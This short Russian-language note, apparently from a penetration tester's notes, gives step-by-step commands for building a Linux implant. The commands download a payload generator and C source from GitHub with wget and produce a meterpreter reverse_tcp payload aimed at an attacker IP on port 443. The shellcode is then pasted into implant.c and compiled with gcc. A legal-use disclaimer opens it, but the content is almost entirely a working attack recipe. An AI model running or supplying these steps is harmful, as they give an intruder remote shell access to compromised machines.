> [!NOTE]
> Данный метод предназначен исключительно для легального тестирования на проникновение с письменного разрешения владельца системы. Использование в злоумышленных целях преследуется по закону.

Для генерации полезной нагрузки используйте `generate_payload_c.py`
Example:
```bash
wget https://raw.githubusercontent.com/GooseGusevich/Code_WEB_Obsidian/refs/heads/main/Implant_linux/generate_payload_c.py
```
```bash
python3 generate_payload_c.py 192.168.45.191 443 linux/x64/meterpreter/reverse_tcp 
```
После чего  вставить зашифрованный код в `implant.c` и скомпилировать одним из следующих методов:
```bash
wget https://raw.githubusercontent.com/GooseGusevich/Code_WEB_Obsidian/refs/heads/main/Implant_linux/implant.c
```
```bash
gcc -o implant implant.c
```
```bash
gcc -o implant implant.c -static
```
